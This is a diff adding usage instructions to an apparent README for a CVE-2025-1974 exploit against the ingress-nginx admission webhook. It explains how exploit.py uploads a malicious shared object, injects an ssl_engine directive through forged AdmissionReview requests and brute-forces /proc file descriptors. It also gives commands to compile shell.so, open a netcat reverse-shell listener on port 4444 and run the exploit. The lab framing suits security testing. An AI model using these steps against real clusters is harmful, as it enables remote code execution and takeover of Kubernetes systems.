@@ -23,3 +23,38 @@ This exploit works in **two phases**:
    The attacker brute-forces `/proc/<pid>/fd/<fd>` combinations by sending forged `AdmissionReview` requests to the **admission webhook**, injecting a malicious `auth-url` that contains:
    ```nginx
    ssl_engine /proc/<pid>/fd/<fd>;
+
+ How to Use exploit.py
+The exploit.py script performs the full CVE-2025-1974 exploit by:
+
+Uploading the malicious .so file using raw sockets
+
+Sending a crafted AdmissionReview request with malicious NGINX directives
+
+Brute-forcing open file descriptors until the payload executes
+
+✅ Prerequisites
+Your vulnerable lab must be running (e.g., deployed via setup.sh)
+
+Ports 8080 and 8443 must be accessible locally
+
+A compiled payload named shell.so must exist in your directory
+
+You can generate the payload with:
+
+~~~gcc -shared -fPIC shell.c -o shell.so
+~~~
+And keep your listener ready:
+
+~~~nc -lvnp 4444~~~
+🧾 Usage Syntax
+~~~
+python3 exploit.py \
+  --upload-url http://127.0.0.1:8080 \
+  --admission-url https://127.0.0.1:8443 \
+  --shell shell.so \
+  --pid-start 26 \
+  --pid-end 40 \
+  --fd-start 1 \
+  --fd-end 100
+~~~
